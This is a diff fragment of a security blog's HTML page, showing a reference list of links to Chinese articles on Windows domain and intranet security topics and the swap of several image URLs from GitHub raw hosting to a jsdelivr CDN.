rel="noopener" href="https://baike.baidu.com/item/NTLM/6371298">https://baike.baidu.com/item/NTLM/6371298</a><br><a target="_blank" rel="noopener" href="https://www.hi-linux.com/posts/61543.html">https://www.hi-linux.com/posts/61543.html</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/LLMNR/1116392">https://baike.baidu.com/item/LLMNR/1116392</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/158393.html">https://www.freebuf.com/sectool/158393.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/179002.html">https://www.freebuf.com/sectool/179002.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/210450.html">https://www.freebuf.com/sectool/210450.html</a><br><a target="_blank" rel="noopener" href="https://www.sqlsec.com/2019/10/hashcat.html">https://www.sqlsec.com/2019/10/hashcat.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/246440.html">https://www.freebuf.com/articles/246440.html</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Windows%E5%9F%9F">https://baike.baidu.com/item/Windows%E5%9F%9F</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lfoder/p/8241548.html">https://www.cnblogs.com/lfoder/p/8241548.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/13216686.html">https://www.cnblogs.com/Xy–1/p/13216686.html</a><br><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/Active_Directory">https://zh.wikipedia.org/wiki/Active_Directory</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%9F%9F%E6%9E%97">https://baike.baidu.com/item/%E5%9F%9F%E6%9E%97</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%9F%9F%E6%A0%91">https://baike.baidu.com/item/%E5%9F%9F%E6%A0%91</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/micr067/p/12263337.html">https://www.cnblogs.com/micr067/p/12263337.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/micr067/p/12307519.html">https://www.cnblogs.com/micr067/p/12307519.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zpchcbd/p/11707302.html">https://www.cnblogs.com/zpchcbd/p/11707302.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/frendguo/p/11761693.html">https://www.cnblogs.com/frendguo/p/11761693.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/websecyw/p/11835830.html">https://www.cnblogs.com/websecyw/p/11835830.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/251389.html">https://www.freebuf.com/articles/web/251389.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/274035.html">https://www.freebuf.com/articles/web/274035.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/280406.html">https://www.freebuf.com/articles/web/280406.html</a><br><a target="_blank" rel="noopener" href="https://y4er.com/post/kerberos-kerberoasting-spn">https://y4er.com/post/kerberos-kerberoasting-spn</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lavender000/p/6931405.html">https://www.cnblogs.com/lavender000/p/6931405.html</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1043370">https://cloud.tencent.com/developer/article/1043370</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1170758">https://cloud.tencent.com/developer/article/1170758</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1752145">https://cloud.tencent.com/developer/article/1752145</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1752180">https://cloud.tencent.com/developer/article/1752180</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1752212">https://cloud.tencent.com/developer/article/1752212</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1760135">https://cloud.tencent.com/developer/article/1760135</a><br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1772183">https://cloud.tencent.com/developer/article/1772183</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/114731.html">https://www.freebuf.com/articles/system/114731.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/194549.html">https://www.freebuf.com/articles/system/194549.html</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Windows%20Power%20Shell">https://baike.baidu.com/item/Windows%20Power%20Shell</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/251267.html">https://www.freebuf.com/articles/network/251267.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/261454.html">https://www.freebuf.com/articles/network/261454.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/henter/article/details/80079531">https://blog.csdn.net/henter/article/details/80079531</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/coderge/articles/13768824.html">https://www.cnblogs.com/coderge/articles/13768824.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/nathan8/article/details/108804056">https://blog.csdn.net/nathan8/article/details/108804056</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E7%BB%84">https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E7%BB%84</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/wulantian/article/details/42418231">https://blog.csdn.net/wulantian/article/details/42418231</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/bring_coco/article/details/113550173">https://blog.csdn.net/bring_coco/article/details/113550173</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32393893/article/details/108904697">https://blog.csdn.net/qq_32393893/article/details/108904697</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_34640691/article/details/111881910">https://blog.csdn.net/qq_34640691/article/details/111881910</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36279445/article/details/110647055">https://blog.csdn.net/qq_36279445/article/details/110647055</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45742511/article/details/117301437">https://blog.csdn.net/qq_45742511/article/details/117301437</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/NetBIOS%E5%8D%8F%E8%AE%AE/8938996">https://baike.baidu.com/item/NetBIOS%E5%8D%8F%E8%AE%AE/8938996</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44064908/article/details/103920329">https://blog.csdn.net/weixin_44064908/article/details/103920329</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45116657/article/details/103449931">https://blog.csdn.net/weixin_45116657/article/details/103449931</a><br><a target="_blank" rel="noopener" href="https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/">https://xiaix.me/li-yong-icmp-sui-dao-chuan-tou-fang-huo-qiang/</a><br><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95">https://baike.baidu.com/item/%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95</a><br><a target="_blank" rel="noopener" href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/">https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</a><br><a target="_blank" rel="noopener" href="https://www.mondayice.com/2021/07/10/cobalt-strike-intranet-penetration-domain-control-attack/">https://www.mondayice.com/2021/07/10/cobalt-strike-intranet-penetration-domain-control-attack/</a><br><a target="_blank" rel="noopener" href="https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/">https://seevae.github.io/2020/09/12/%E8%AF%A6%E8%A7%A3kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B/</a><br><a target="_blank" rel="noopener" href="https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/">https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/</a><br><a target="_blank" rel="noopener" href="https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/">https://mysock.net/2021/01/03/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E7%94%A8%20rar2john+hashcat%20%E7%A0%B4%E8%A7%A3%20RAR%20%E6%96%87%E4%BB%B6%E5%AF%86%E7%A0%81/</a></p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/TeamsSix_Subscription_Logo2.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>
 
                 
             </div>
@@ -3351,7 +3351,7 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
                 <a href="/211028-204606.html">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202110282041924.png" class="responsive-img" alt="【经验总结】Docker 使用笔记">
+                        <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110282041924.png" class="responsive-img" alt="【经验总结】Docker 使用笔记">
                         
                         <span class="card-title">【经验总结】Docker 使用笔记</span>
                     </div>
@@ -3403,7 +3403,7 @@ run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span>
                 <a href="/211022-122217.html">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/teamssix/BlogImages/main/imgs/202110091330529.png" class="responsive-img" alt="【内网学习笔记】30、跨域安全（完结）">
+                        <img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202110091330529.png" class="responsive-img" alt="【内网学习笔记】30、跨域安全（完结）">
                         
                         <span class="card-title">【内网学习笔记】30、跨域安全（完结）</span>
                     </div>
